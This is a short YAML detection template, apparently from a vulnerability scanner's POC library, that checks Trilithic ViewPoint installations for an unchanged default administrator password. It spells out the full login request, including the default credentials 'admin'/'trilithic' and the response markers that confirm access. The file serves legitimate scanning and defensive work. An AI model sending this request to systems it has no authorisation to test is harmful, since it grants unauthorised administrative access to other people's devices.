# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      {u:"admin", t:"undefined", p:"trilithic", d:"", r:false, w:false}
    headers:
      Content-Type: application/json
      Cookie: trilithic_win_auth=false
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"authorized":true'
          - redirectUrl
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/ViewPoint/admin/Site/ViewPointLogin'
id: trilithic-viewpoint-default-password
info:
  author: davidmckennirey
  description: ""
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Trilithic Viewpoint Default Login
  severity: high
  tags: trilithic-viewpoint,default-login,argus-import
